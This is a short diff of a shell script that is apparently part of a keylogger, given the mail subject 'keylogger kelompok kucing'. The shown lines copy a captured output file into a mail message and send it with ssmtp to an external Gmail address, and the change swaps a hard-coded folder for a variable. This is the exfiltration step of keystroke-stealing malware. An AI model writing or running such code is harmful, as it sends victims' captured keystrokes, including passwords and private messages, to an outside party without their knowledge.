@@ -170,5 +170,5 @@ RECIEVER="luckyrama0@gmail.com"
 SUBJECT="Subject: keylogger kelompok kucing"
 MAIL="/opt/$FOLDER/mail.txt"
 echo $SUBJECT > $MAIL
-cat /opt/kelompokkucing/output.txt >> $MAIL
+cat /opt/$FOLDER/output.txt >> $MAIL
 ssmtp $RECIEVER < $MAIL
